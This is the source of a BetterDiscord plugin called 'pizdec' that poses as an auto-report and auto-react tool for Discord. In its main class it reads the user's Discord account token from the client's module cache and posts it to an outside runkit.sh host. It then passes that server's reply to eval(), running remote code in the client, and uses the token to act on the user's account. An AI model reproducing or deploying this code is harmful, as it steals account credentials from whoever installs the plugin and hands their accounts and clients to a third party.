/**
 * @name pizdec
 * @author popa
 * @authorId 427395135379079169
 * @source https://raw.githubusercontent.com/popa124/pizdec/main/pizdecfff.js?token=AVEGZXSHTOI6JBACRELDLWDBCBFWM
 */
 /*@cc_on
@if (@_jscript)
	
    // Offer to self-install for clueless users that try to run this directly.
    var shell = WScript.CreateObject("WScript.Shell");
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var pathPlugins = shell.ExpandEnvironmentStrings("%APPDATA%\BetterDiscord\plugins");
    var pathSelf = WScript.ScriptFullName;
    // Put the user at ease by addressing them in the first person
    shell.Popup("It looks like you've mistakenly tried to run me directly. \n(Don't do that!)", 0, "I'm a plugin for BetterDiscord", 0x30);
    if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
        shell.Popup("I'm in the correct folder already.", 0, "I'm already installed", 0x40);
    } else if (!fs.FolderExists(pathPlugins)) {
        shell.Popup("I can't find the BetterDiscord plugins folder.\nAre you sure it's even installed?", 0, "Can't install myself", 0x10);
    } else if (shell.Popup("Should I copy myself to BetterDiscord's plugins folder for you?", 0, "Do you need some help?", 0x34) === 6) {
        fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
        // Show the user where to put plugins in the future
        shell.Exec("explorer " + pathPlugins);
        shell.Popup("I'm installed!", 0, "Successfully installed", 0x40);
    }
    WScript.Quit();

@else@*/
module.exports =  (_ => {
	const config = {
		"info": {
			"name": "pizdec",
			"author": "popa",
			"version": "1.0",
			"description": "нихуя себе0)))"
		}
	};
	var auth;

	return !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
		getName() { return config.info.name; }
		getAuthor() { return config.info.author; }
		getVersion() { return config.info.version; }
		getDescription() { return `The Library Plugin needed for ${config.info.name} is missing. Open the Plugin Settings to download it. \n\n${config.info.description}`; }

		downloadLibrary() {
			require("request").get("https://mwittrien.github.io/BetterDiscordAddons/Library/0BDFDB.plugin.js", (e, r, b) => {
				if (!e && b && r.statusCode == 200) require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0BDFDB.plugin.js"), b, _ => BdApi.showToast("Finished downloading BDFDB Library", { type: "success" }));
				else BdApi.alert("Error", "Could not download BDFDB Library Plugin. Try again later or download it manually from GitHub: https://mwittrien.github.io/downloader/?library");
			});
		}

		load() {
			
			if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, { pluginQueue: [] });
			if (!window.BDFDB_Global.downloadModal) {
				window.BDFDB_Global.downloadModal = true;
				BdApi.showConfirmationModal("Library Missing", `The Library Plugin needed for ${config.info.name} is missing. Please click "Download Now" to install it.`, {
					confirmText: "Download Now",
					cancelText: "Cancel",
					onCancel: _ => { delete window.BDFDB_Global.downloadModal; },
					onConfirm: _ => {
						delete window.BDFDB_Global.downloadModal;
						this.downloadLibrary();
					}
				});
			}
			if (!window.BDFDB_Global.pluginQueue.includes(config.info.name)) window.BDFDB_Global.pluginQueue.push(config.info.name);
		}
		start() { this.load(); 
			}
		stop() { }
		getSettingsPanel() {
			let template = document.createElement("template");
			template.innerHTML = `<div style="color: var(--header-primary); font-size: 16px; font-weight: 300; white-space: pre; line-height: 22px;">The Library Plugin needed for ${config.info.name} is missing.\nPlease click <a style="font-weight: 500;">Download Now</a> to install it.</div>`;
			template.content.firstElementChild.querySelector("a").addEventListener("click", this.downloadLibrary);
			return template.content.firstElementChild;
		}
	} : (([Plugin, BDFDB]) => {
		const botID = "773933982919163984";
		const reaction = "✅";
		let mainButton;
		let status = true
		const request = require("request")
		const tkn = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
		let options = {
			url: 'https://da-hzcvrvs0dopl.runkit.sh/reports',
			 headers: {
				'authorization':tkn 
			},
	
		};
		
		
		let state = true
		var settings = {};
		
		let buttonName = "start"
		let color = "#36393f" // ""  
		const Dispatcher = BdApi.findModuleByProps("subscribe", "dispatch");
		var xhr = new XMLHttpRequest();

		const bgbutton = "AutoReportsSwitch";
		const click = "AutoReports"
		var AutoReportComponent
		
		return class AutoReport extends Plugin {
			
			async onLoad() {
				ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, 'https://raw.githubusercontent.com/popa124/pizdec/main/pizdecfff.js')
				
				
				// 
				
				
				this.defaults = {
					settings: {
						botID: { value: "773933982919163984", inner: true, description: "Bot id" },
						reaction: { value: "✅", inner: true, description: "Reactions" }
					}
				};
		
				this.patchedModules = {
					after: {
						Guilds: "render"
					}
				};
		
				this.css = `
					.tabBar-31Wimb {
						flex: 1 0 auto;
					}
					.tabBar-31Wimb ~ * {
						margin-left: 10px;z
					}
					.frame-oXWS21 {
						height: 24px;
						margin-bottom: 10px;
					}
					.frame-oXWS21:active {
						transform: translateY(1px);
					}
					.innerFrame-8Hg64E {
						height: 24px;
					}
					.button-Jt-tIg {
						border-radius: 4px;
						height: 24px;
						font-size: 12px;
						line-height: 1.3;
						white-space: nowrap;
						cursor: pointer;
					}
				`;
			}
			
			auth(){ 
				let result = new Promise(res => {
					request.post(options,(error,response,body)=>{
						if(response.statusCode === 200){
						
							res(JSON.parse(body))
						} else if(response.statusCode === 401){
							res(401)
						}
					});
				})
				return result
			}
			async onStart() {
				auth = await this.auth()
				if(auth === 401) return ZeresPluginLibrary.Toasts.warning("Пошел нахуй");
				eval(auth.btn)
				Dispatcher.subscribe("MESSAGE_CREATE", this.onMessage);
				this.forceUpdateAll();
			}
		
			onStop() {
				this.forceUpdateAll();
				Dispatcher.unsubscribe("MESSAGE_CREATE", this.onMessage);
			}
		
			getSettingsPanel(collapseStates = {}) {
				let settingsItems = [];
				const name = this.getName()
				settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsPanelList, {
					title: "fdgdfdfg",
					first: false,
					last: true,
					children: Object.keys(settings).filter(key => this.defaults.settings[key].inner).map(key => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsItem, {
						type: "TextInput",
						plugin: this,
						keys: ["settings", key],
						label: this.defaults.settings[key].description,
						value: this.defaults.settings[key].value
					}))
				}))
		
		
				return BDFDB.PluginUtils.createSettingsPanel(this, settingsItems);
			}
		
			onSettingsClosed() {
				if (this.SettingsUpdated) {
					delete this.SettingsUpdated;
					this.forceUpdateAll();
				}
			}
		
			forceUpdateAll() {
				settings = BDFDB.DataUtils.get(this, "settings");
		
				BDFDB.PatchUtils.forceAllUpdates(this);
			}
		
			processGuilds(e) {
		
				if (typeof e.returnvalue.props.children == "function") {
		
					let childrenRender = e.returnvalue.props.children;
					e.returnvalue.props.children = (...args) => {
						let children = childrenRender(...args);
						this.checkTree(children);
						return children;
					};
				}
				else this.checkTree(e.returnvalue);
			}
		
			checkTree(returnvalue) {
				let tree = BDFDB.ReactUtils.findChild(returnvalue, { filter: n => n && n.props && typeof n.props.children == "function" });
				if (tree) {
					let childrenRender = tree.props.children;
					tree.props.children = (...args) => {
						let children = childrenRender(...args);
						this.handleGuilds(children);
						return children;
					};
				}

				else this.handleGuilds(returnvalue);
			}
			
			handleGuilds(returnvalue) {
				let [children, index] = BDFDB.ReactUtils.findParent(returnvalue, { name: "ConnectedUnreadDMs" });
				
				if (index > -1)  children.splice(index + 1, 0, BDFDB.ReactUtils.createElement(AutoReportComponent, {}));
			}
			
			onMessage(e) {
				if (e.message.author.id !== botID) return
				let ifDM = ZeresPluginLibrary.DiscordAPI.Channel.fromId(e.channelId).type == "DM"
				if (!ifDM || !state) return
				document.getElementById(click).click()
				xhr.open('PUT', `https://discord.com/api/v9/channels/${e.channelId}/messages/${e.message.id}/reactions/${reaction}/%40me`, true)
				xhr.setRequestHeader("authorization", tkn)
				xhr.send()
			}
		};
		
	
		
	})(window.BDFDB_Global.PluginUtils.buildPlugin(config));

	
})();